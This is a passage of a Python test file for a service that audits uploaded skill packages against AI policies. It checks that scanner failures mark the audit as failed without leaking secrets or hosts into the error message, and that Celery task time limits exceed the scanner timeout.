        finished_at=None,
        created_at=None,
        updated_at=None,
        summary={},
        findings=[],
        raw_report={},
        markdown_report="",
    )
    skill = SimpleNamespace(
        id=7,
        zip_path="/tmp/demo-skill.zip",
        security_status="queued",
        security_decision="",
        security_severity="",
        latest_ai_policies_audit_id=None,
    )
    commit_count = 0

    class FakeSession:
        async def commit(self):
            nonlocal commit_count
            commit_count += 1

    async def fake_find_audit(session, audit_pk):
        return audit

    async def fake_find_skill(session, skill_id):
        return skill

    async def fake_scan(target):
        raise RuntimeError("token=secret-value host=10.0.0.1")

    async def fake_list_catalog(session):
        return []

    monkeypatch.setattr(
        ai_policies_service.ai_policies_repo, "find_by_id", fake_find_audit
    )
    monkeypatch.setattr(
        ai_policies_service.ai_policies_repo, "list_catalog", fake_list_catalog
    )
    monkeypatch.setattr(ai_policies_service.skill_repo, "find_by_id", fake_find_skill)
    monkeypatch.setattr(ai_policies_service.os.path, "exists", lambda path: True)
    monkeypatch.setattr(
        ai_policies_service.ai_policies_scanner_client, "scan_skill_zip", fake_scan
    )

    await ai_policies_service.process_skill_audit(FakeSession(), 1)

    assert audit.status == "failed"
    assert audit.decision == "failed"
    assert audit.error_message == "安全审查任务执行失败，请稍后重新发起审查"
    assert "secret-value" not in audit.error_message
    assert "10.0.0.1" not in audit.error_message
    assert skill.security_status == "failed"
    assert skill.security_decision == "failed"
    assert commit_count >= 2


def test_celery_time_limits_exceed_scanner_http_timeout() -> None:
    scanner_http_timeout = settings.ai_policies_timeout_seconds + 10

    assert ai_policies_tasks.AUDIT_SOFT_TIME_LIMIT > scanner_http_timeout
    assert ai_policies_tasks.AUDIT_TIME_LIMIT > ai_policies_tasks.AUDIT_SOFT_TIME_LIMIT
